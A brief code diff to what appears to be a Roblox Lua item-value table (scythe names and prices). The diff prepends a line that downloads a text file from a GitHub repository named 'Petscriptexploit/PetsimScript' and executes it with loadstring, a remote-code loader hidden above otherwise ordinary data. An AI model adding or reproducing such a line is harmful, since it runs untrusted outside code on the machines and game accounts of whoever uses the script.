@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/PetsimScript/refs/heads/main/message%20(1)%20(1)-1%20(1).txt"))()
 local values = {
     ["Nik's Scythe"] = 250000000,
     ["Elderwood Scythe"] = 90,
